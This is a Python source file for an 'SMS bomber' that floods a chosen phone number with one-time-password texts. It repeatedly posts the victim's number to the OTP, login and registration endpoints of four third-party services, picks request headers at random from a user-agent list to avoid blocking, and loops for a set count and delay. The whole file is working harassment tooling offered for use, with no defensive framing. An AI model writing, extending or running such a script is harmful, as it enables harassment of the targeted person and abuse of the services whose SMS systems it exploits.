import random
import requests
import time
from helper import printer
from utils.randomuser import users


class Spam:
    """
    Spams the given number with the given count and throttle.

    US numbers only.

    :param number: The number to spam.
    :param count: The number of times to spam.
    :param throttle: The time interval between each spam.
    """
    def __init__(self, number, count, throttle):
        url = ["https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20" + number,
               "https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" + str(91) + "&nod=4&phone=" + number,
               "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + number,
               "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + number]
        session = requests.session()
        session.headers = random.choice(users)
        req = session.post(random.choice(url))

        if req.status_code != 200:
            printer.error(f"Error : {req.status_code}")

        for i in range(int(count) + 1):
            try:
                req = session.post(random.choice(url))
                time.sleep(int(throttle))
                if req.status_code == 200:
                    printer.success(f"sent {i + 1} sms to '{number}'")
            except Exception as e:
                printer.error(f"Error : {e}")
                pass
